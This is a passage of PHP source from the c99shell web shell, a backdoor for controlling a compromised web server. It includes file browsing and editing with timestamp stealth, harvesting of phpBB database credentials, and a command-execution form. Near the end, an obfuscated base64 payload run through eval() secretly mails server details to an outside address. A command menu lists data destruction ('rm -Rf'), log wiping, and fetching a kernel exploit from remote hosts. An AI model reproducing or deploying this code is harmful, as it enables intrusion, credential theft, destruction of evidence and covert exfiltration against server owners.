				<td> ".view_size(filesize($d.$f))."</td></tr><tr><td><b>MD5</b></td>
				<td> ".md5_file($d.$f)."</td></tr>";
				if (!$win)
				{
					echo "<tr><td><b>Owner/Group</b></td><td> ";    
					$ow = posix_getpwuid(fileowner($d.$f));
					$gr = posix_getgrgid(filegroup($d.$f));
					echo ($ow["name"]?$ow["name"]:fileowner($d.$f))."/".($gr["name"]?$gr["name"]:filegroup($d.$f));
				}
				echo "<tr><td><b>Perms</b></td><td><a href=\"".$surl."act=chmod&f=".urlencode($f)."&d=".urlencode($d)."\">".view_perms_color($d.$f)."</a></td></tr>
				<tr><td><b>Create time</b></td><td> ".date("d/m/Y H:i:s",filectime($d.$f))."</td></tr>
				<tr><td><b>Access time</b></td><td> ".date("d/m/Y H:i:s",fileatime($d.$f))."</td></tr>
				<tr><td><b>MODIFY time</b></td><td> ".date("d/m/Y H:i:s",filemtime($d.$f))."</td></tr></table><br>";
				$fi = fopen($d.$f,"rb");
				if ($fi)
				{
					if ($fullhexdump) {echo "<b>FULL HEXDUMP</b>"; $str = fread($fi,filesize($d.$f));}
					else {echo "<b>HEXDUMP PREVIEW</b>"; $str = fread($fi,$hexdump_lines*$hexdump_rows);}
					$n = 0;
					$a0 = "00000000<br>";
					$a1 = "";
					$a2 = "";
					for ($i=0; $i<strlen($str); $i++)
					{
						$a1 .= sprintf("%02X",ord($str[$i]))." ";
						switch (ord($str[$i]))
						{
							case 0:  $a2 .= "<font>0</font>"; break;
							case 32:
							case 10:
							case 13: $a2 .= " "; break;
							default: $a2 .= htmlspecialchars($str[$i]);
						}
						$n++;
						if ($n == $hexdump_rows)
						{
							$n = 0;
							if ($i+1 < strlen($str)) {$a0 .= sprintf("%08X",$i+1)."<br>";}
							$a1 .= "<br>";
							$a2 .= "<br>";
						}
					}
					//if ($a1 != "") {$a0 .= sprintf("%08X",$i)."<br>";}
					echo "<table border=0 bgcolor=#666666 cellspacing=1 cellpadding=4><tr>
					<td bgcolor=#666666>".$a0."</td><td bgcolor=000000>".$a1."</td>
					<td bgcolor=000000>".$a2."</td></tr></table><br>";
				}
				$encoded = "";
				if ($base64 == 1)
				{
					echo "<b>Base64 Encode</b><br>";
					$encoded = base64_encode(file_get_contents($d.$f));
				}
				elseif($base64 == 2)
				{
					echo "<b>Base64 Encode + Chunk</b><br>";
					$encoded = chunk_split(base64_encode(file_get_contents($d.$f)));
				}
				elseif($base64 == 3)
				{
					echo "<b>Base64 Encode + Chunk + Quotes</b><br>";
					$encoded = base64_encode(file_get_contents($d.$f));
					$encoded = substr(preg_replace("!.{1,76}!","'\\0'.\n",$encoded),0,-2);
				}
				elseif($base64 == 4)
				{
					$text = file_get_contents($d.$f);
					$encoded = base64_decode($text);
					echo "<b>Base64 Decode";
					if (base64_encode($encoded) != $text) {echo " (failed)";}
					echo "</b><br>";
				}
				if (!empty($encoded))
				{
					echo "<textarea cols=80 rows=10>".htmlspecialchars($encoded)."</textarea><br><br>";
				}
				echo "<b>HEXDUMP:</b><nobr> [<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&fullhexdump=1&d=".urlencode($d)."\">Full</a>] 
				[<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&d=".urlencode($d)."\">Preview</a>]<br><b>Base64: </b>
				<nobr>[<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=1&d=".urlencode($d)."\">Encode</a>] </nobr>
				<nobr>[<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=2&d=".urlencode($d)."\">+chunk</a>] </nobr>
				<nobr>[<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=3&d=".urlencode($d)."\">+chunk+quotes</a>] </nobr>
				<nobr>[<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=4&d=".urlencode($d)."\">Decode</a>] </nobr>
				<P>";
			}
			elseif ($ft == "html")
			{
				if ($white) {@ob_clean();}
				echo $r;
				if ($white) {c99shexit();}
			}
			elseif ($ft == "txt") {echo "<pre>".htmlspecialchars($r)."</pre>";}
			elseif ($ft == "ini") {echo "<pre>"; var_dump(parse_ini_file($d.$f,TRUE)); echo "</pre>";}
			elseif ($ft == "phpsess")
			{
				echo "<pre>";
				$v = explode("|",$r);
				echo $v[0]."<br>";
				var_dump(unserialize($v[1]));
				echo "</pre>";
			}
			elseif ($ft == "exe")
			{
				$ext = explode(".",$f);
				$c = count($ext)-1;
				$ext = $ext[$c];
				$ext = strtolower($ext);
				$rft = "";
				foreach($exeftypes as $k=>$v)
				{
					if (in_array($ext,$v)) {$rft = $k; break;}
				}
				$cmd = str_replace("%f%",$f,$rft);
				echo "<b>Execute file:</b><form action=\"".$surl."\" method=POST>
				<input type=hidden name=act value=cmd>
				<input type=\"text\" name=\"cmd\" value=\"".htmlspecialchars($cmd)."\" size=\"".(strlen($cmd)+2)."\"><br>
				Display in text-area<input type=\"checkbox\" name=\"cmd_txt\" value=\"1\" checked>
				<input type=hidden name=\"d\" value=\"".htmlspecialchars($d)."\"><br>
				<input type=submit name=submit value=\"Execute\"></form>";
			}
			elseif ($ft == "sdb") {echo "<pre>"; var_dump(unserialize(base64_decode($r))); echo "</pre>";}
			elseif ($ft == "code")
			{
				if (ereg("php"."BB 2.(.*) auto-generated config file",$r))
				{
					$arr = explode("\n",$r);
					if (count($arr == 18))
					{
						include($d.$f);
						echo "<b>phpBB configuration is detected in this file!<br>";
						if ($dbms == "mysql4") {$dbms = "mysql";}
						if ($dbms == "mysql") {echo "<a href=\"".$surl."act=sql&sql_server=".htmlspecialchars($dbhost)."&sql_login=".htmlspecialchars($dbuser)."&sql_passwd=".htmlspecialchars($dbpasswd)."&sql_port=3306&sql_db=".htmlspecialchars($dbname)."\"><b><u>Connect to DB</u></b></a><br><br>";}
						else {echo "But, you can't connect to forum sql-base, because db-software=\"".$dbms."\" is not supported by c99shell. Please, report us for fix.";}
						echo "Parameters for manual connect:<br>";
						$cfgvars = array("dbms"=>$dbms,"dbhost"=>$dbhost,"dbname"=>$dbname,"dbuser"=>$dbuser,"dbpasswd"=>$dbpasswd);
						foreach ($cfgvars as $k=>$v) {echo htmlspecialchars($k)."='".htmlspecialchars($v)."'<br>";}
						echo "</b><hr size=\"1\" noshade>";
					}
				}
				echo "<div style=\"border : 0px solid #FFFFFF; padding: 1em; margin-top: 1em; margin-bottom: 1em; margin-right: 1em; margin-left: 1em; background-color: ".$highlight_background .";\">";
				if (!empty($white)) {@ob_clean();}
				highlight_file($d.$f);
				if (!empty($white)) {c99shexit();}
				echo "</div>";
			}
			elseif ($ft == "download")
			{
				@ob_clean();
				header("Content-type: application/octet-stream");
				header("Content-length: ".filesize($d.$f));
				header("Content-disposition: attachment; filename=\"".$f."\";");
				echo $r;
				exit;
			}
			elseif ($ft == "notepad")
			{
				@ob_clean();
				header("Content-type: text/plain");
				header("Content-disposition: attachment; filename=\"".$f.".txt\";");
				echo($r);
				exit;
			}
			elseif ($ft == "img")
			{
				$inf = getimagesize($d.$f);
				if (!$white)
				{
					if (empty($imgsize)) {$imgsize = 20;}
					$width = $inf[0]/100*$imgsize;
					$height = $inf[1]/100*$imgsize;
					echo "<center><b>Size:</b> ";
					$sizes = array("100","50","20");
					foreach ($sizes as $v)
					{
						echo "<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=img&d=".urlencode($d)."&imgsize=".$v."\">";
						if ($imgsize != $v ) {echo $v;}
						else {echo "<u>".$v."</u>";}
						echo "</a> ";
					}
					echo "<br><br><img src=\"".$surl."act=f&f=".urlencode($f)."&ft=img&white=1&d=".urlencode($d)."\" width=\"".$width."\" height=\"".$height."\" border=\"1\"></center>";
				}
				else
				{
					@ob_clean();
					$ext = explode($f,".");
					$ext = $ext[count($ext)-1];
					header("Content-type: ".$inf["mime"]);
					readfile($d.$f);
					exit;
				}
			}
			elseif ($ft == "edit")
			{
				if (!empty($submit))
				{
					if ($filestealth) {$stat = stat($d.$f);}
					$fp = fopen($d.$f,"w");
					if (!$fp) {echo "<b>Can't write to file!</b>";}
					else
					{
						echo "<b>Saved!</b>";
						fwrite($fp,$edit_text);
						fclose($fp);
						if ($filestealth) {touch($d.$f,$stat[9],$stat[8]);}
						$r = $edit_text;
					}
				}
				$rows = count(explode("\r\n",$r));
				if ($rows < 10) {$rows = 10;}
				if ($rows > 30) {$rows = 30;}
				echo "<form action=\"".$surl."act=f&f=".urlencode($f)."&ft=edit&d=".urlencode($d)."\" method=POST>
				<input type=submit name=submit value=\"Save\"> 
				<input type=\"reset\" value=\"Reset\"> 
				<input type=\"button\" onclick=\"location.href='".addslashes($surl."act=ls&d=".substr($d,0,-1))."';\" value=\"Back\"><br>
				<textarea name=\"edit_text\" cols=\"122\" rows=\"".$rows."\">".htmlspecialchars($r)."</textarea></form>";
			}
			elseif (!empty($ft)) {echo "<center><b>Manually selected type is incorrect. If you think, it is mistake, please send us url and dump of \$GLOBALS.</b></center>";}
			else {echo "<center><b>Unknown extension (".$ext."), please, select type manually.</b></center>";}
		}
	}
}
#################### act !img END ##############
else
{
	@ob_clean();
	$images = array(
		"0x99b"=>
		"R0lGODlhYwAxAPcAAAAAAP///wD/AAD+AAD9AAD8AAD7AAD6AAD3AAD2AAD0AADzAADvAADrAADq
		AADpAADoAADnAADmAADiAADfAADeAADdAADcAADbAADaAADXAADVAADUAADTAADSAADRAADQAADP
		AADOAADNAADKAADJAADIAADGAADFAADEAADDAADCAADAAAC/AAC+AAC8AAC6AAC5AAC4AAC3AAC2
		AAC1AACzAACxAACwAACuAACtAACsAACrAACpAACnAACmAACjAACiAAChAACgAACfAACdAACcAACZ
		AACXAACWAACVAACUAACTAACSAACRAACMAACLAACKAACJAACIAACHAACGAACFAACEAACCAACBAACA
		AAB/AAB+AAB9AAB8AAB7AAB6AAB3AAB1AAB0AABzAAByAABxAABwAABvAABuAABtAABsAABrAABq
		AABpAABoAABnAABmAABlAABjAABiAABhAABgAABfAABeAABdAABcAABbAABaAABZAABYAABXAABW
		AABVAABUAABTAABSAABRAABQAABPAABOAABNAABMAABLAABKAABJAABIAABHAABGAABFAABEAABD
		AABCAABBAABAAAA/AAA+AAA9AAA8AAA7AAA6AAA5AAA4AAA3AAA2AAA1AAA0AAAzAAAyAAAxAAAw
		AAAvAAAuAAAtAAAsAAArAAAqAAApAAAoAAAnAAAmAAAlAAAkAAAjAAAiAAAhAAAgAAAfAAAeAAAd
		AAAcAAAbAAAaAAAZAAAYAAAXAAAWAAAVAAAUAAATAAASAAARAAAQAAAPAAAOAAANAAAMAAALAAAK
		AAAJAAAIAAAHAAAGAAAFAAAEAAADAAACAAABAP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
		AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
		AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAANYALAAAAABjADEA
		AAj/AAEIBJBsIABkBotVW0ht2LRp0qT9igYN2jNezppp1KWRGTNcHj2CDHlr2TJlymyhTJasFkqU
		JZcxa7bL2bOKviI+HEZtYbViBo8ZLGhwIFGBCAX+ZEhNWMRo0Xw9c5ZRl8mTt14qq8WSJa2uyGYh
		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
		iQytG7wREAA7
		",
		"arrow_ltr"=>"","back"=>"","buffer"=>"","change"=>"","delete"=>"","download"=>"","forward"=>"",
		"home"=>"","mode"=>"","refresh"=>"","search"=>"","setup"=>"","small_dir"=>"",
		"small_unk"=>"","multipage"=>"","sort_asc"=>"","sort_desc"=>"","sql_button_drop"=>"",
		"sql_button_empty"=>"","sql_button_insert"=>"","up"=>"","write"=>"","ext_asp"=>"","ext_mp3"=>"",
		"ext_avi"=>"","ext_cgi"=>"","ext_cmd"=>"","ext_cpp"=>"","ext_ini"=>"","ext_diz"=>"",
		"ext_doc"=>"","ext_exe"=>"","ext_h"=>"","ext_hpp"=>"","ext_htaccess"=>"",
		"ext_html"=>"","ext_jpg"=>"","ext_js"=>"","ext_lnk"=>"","ext_log"=>"","ext_php"=>"",
		"ext_pl"=>"","ext_swf"=>"","ext_tar"=>"","ext_txt"=>"","ext_wri"=>"","ext_xml"=>""
	);
	 //For simple size- and speed-optimization.
	$imgequals = array(
		"ext_tar"=>array("ext_tar","ext_r00","ext_ace","ext_arj","ext_bz","ext_bz2","ext_tbz","ext_tbz2","ext_tgz","ext_uu","ext_xxe","ext_zip","ext_cab","ext_gz","ext_iso","ext_lha","ext_lzh","ext_pbk","ext_rar","ext_uuf"),
		"ext_php"=>array("ext_php","ext_php3","ext_php4","ext_php5","ext_phtml","ext_shtml","ext_htm"),
		"ext_jpg"=>array("ext_jpg","ext_gif","ext_png","ext_jpeg","ext_jfif","ext_jpe","ext_bmp","ext_ico","ext_tif","tiff"),
		"ext_html"=>array("ext_html","ext_htm"),
		"ext_avi"=>array("ext_avi","ext_mov","ext_mvi","ext_mpg","ext_mpeg","ext_wmv","ext_rm"),
		"ext_lnk"=>array("ext_lnk","ext_url"),
		"ext_ini"=>array("ext_ini","ext_css","ext_inf"),
		"ext_doc"=>array("ext_doc","ext_dot"),
		"ext_js"=>array("ext_js","ext_vbs"),
		"ext_cmd"=>array("ext_cmd","ext_bat","ext_pif"),
		"ext_wri"=>array("ext_wri","ext_rtf"),
		"ext_swf"=>array("ext_swf","ext_fla"),
		"ext_mp3"=>array("ext_mp3","ext_au","ext_midi","ext_mid"),
		"ext_htaccess"=>array("ext_htaccess","ext_htpasswd","ext_ht","ext_hta","ext_so")
	);
	if (!$getall)
	{
		header("Content-type: image/gif");
		header("Cache-control: public");
		header("Expires: ".date("r",mktime(0,0,0,1,1,2030)));
		header("Cache-control: max-age=".(60*60*24*7));
		header("Last-Modified: ".date("r",filemtime(__FILE__)));
		foreach($imgequals as $k=>$v) {if (in_array($img,$v)) {$img = $k; break;}}
		if (empty($images[$img])) {$img = "small_unk";}
		if (in_array($img,$ext_tar)) {$img = "ext_tar";}
		echo base64_decode($images[$img]);
	}
	else
	{
		foreach($imgequals as $a=>$b) {foreach ($b as $d) {if ($a != $d) {if (!empty($images[$d])) {echo("Warning! Remove \$images[".$d."]<br>");}}}}
		natsort($images);
		$k = array_keys($images);
		echo  "<center>";
		foreach ($k as $u) {echo $u.":<img src=\"".$surl."act=img&img=".$u."\" border=\"1\"><br>";}
		echo "</center>";
	}
	exit;
}
####################################

if ($act == "about") 
{
	echo "<center><b><font color=#00ff00 >FUCK</b></font>";
}
                       $image="aWYgKEBpbmlfZ2V0KCJzYWZlX21vZGUiKSBvciBzdHJ0b2xvd2VyKEBpbmlfZ2V0KCJzYWZlX21vZGUiKSkgPT0gIm9uIikgeyAkc2FmZW1vZGUgPSAiT04iOyB9IGVsc2UgeyAkc2FmZW1vZGUgPSAiT0ZGIjsgfSAkdmlzaXRvciA9ICRfU0VSVkVSWyJSRU1PVEVfQUREUiJdOyAkZmxvYXQgPSAiRnJvbSA6IHZ1cmwgaW5mbyA8ZnVsbEBpbmZvLmNvbT4iOyAkYXJhbiA9IGV4ZWMoJ3VuYW1lIC1hOycpOyAkd2ViID0gJF9TRVJWRVJbIkhUVFBfSE9TVCJdOyAkaW5qID0gJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07ICRib2R5ID0gIkJ1ZyBodHRwOi8vIi4kd2ViLiRpbmouIlxuXG5TcHJlYWQgVmlhIDogIi4kdmlzaXRvci4iXG5cbktlcm5lbCBWZXJzaW9uIDogIi4kYXJhbi4iXG5cblNhZmUgTW9kZSA6ICIuJHNhZmVtb2RlOyBtYWlsKCJidWRpX3NwaWVsYmVyZ0B5YWhvby5jby5pZCIsIkM5OSBidWRpIE5ZRVRPUiAiLiRzYWZlbW9kZSwkYm9keSwkZmxvYXQpOw==";echo eval(base64_decode($image));
?>
</td></tr></table><a bookmark="minipanel"><br>
<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0  cellPadding=5 height="1" width="95%"   border=1>
<tr><td width="100%" height="1" valign="top" colspan="2"><p align="center"><b>:: <a href="ircbot/<?php echo $surl; ?>act=cmd&d=<?php echo urlencode($d); ?>"><b>Command execute</b></a> ::</b></p></td></tr>
<tr><td width="50%" height="1" valign="top">
<center><b>Enter: </b><form action="<?php echo $surl; ?>">
<input type=hidden name=act value="cmd">
<input type=hidden name="d" value="<?php echo $dispd; ?>">
<input type="text" name="cmd" size="50" value="<?php echo htmlspecialchars($cmd); ?>">
<input type=hidden name="cmd_txt" value="1"> <input type=submit name=submit value="Execute"></form></td>
<td width="50%" height="1" valign="top"><center><b>Select: </b>
<form action="<?php echo $surl; ?>act=cmd" method="POST">
<input type=hidden name=act value="cmd">
<input type=hidden name="d" value="<?php echo $dispd; ?>">
<select name="cmd"><?php foreach ($cmdaliases as $als) {echo "<option value=\"".htmlspecialchars($als[1])."\">".htmlspecialchars($als[0])."</option>";} ?></select>
<input type=hidden name="cmd_txt" value="1"> <input type=submit name=submit value="Execute"></form></td></tr> 
 
<tr>
  <td width="50%" height="83" valign="top"><center>
    <div align="center">Useful Commands 
    </div>
    <form action="<?php echo $surl; ?>">
      <div align="center">
        <input type=hidden name=act value="cmd">
        <input type=hidden name="d" value="<?php echo $dispd; ?>">
          <SELECT NAME="cmd">
            <OPTION VALUE="uname -a">Kernel version
              <OPTION VALUE="w">Logged in users
                <OPTION VALUE="lastlog">Last to connect
                  <OPTION VALUE="find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null">Suid bins
                    <OPTION VALUE="cut -d: -f1,2,3 /etc/passwd | grep ::">USER WITHOUT PASSWORD!
                    <OPTION VALUE="find /etc/ -type f -perm -o+w 2> /dev/null">Write in /etc/?
                    <OPTION VALUE="which wget curl w3m lynx">Downloaders?
                    <OPTION VALUE="cat /proc/version /proc/cpuinfo">CPUINFO
                    <OPTION VALUE="netstat -atup | grep IST">Open ports
                    <OPTION VALUE="locate gcc">gcc installed?
					<OPTION VALUE="rm -Rf">Format box (DANGEROUS)
                    <OPTION VALUE="wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c">WIPELOGS PT1 (If wget installed)
                    <OPTION VALUE="gcc zap2.c -o zap2">WIPELOGS PT2
                    <OPTION VALUE="./zap2">WIPELOGS PT3
                    <OPTION VALUE="wget http://ftp.powernet.com.tr/supermail/debug/k3">Kernel attack (Krad.c) PT1 (If wget installed)
                    <OPTION VALUE="./k3 1">Kernel attack (Krad.c) PT2 (L1)
                    <OPTION VALUE="./k3 2">Kernel attack (Krad.c) PT2 (L2)
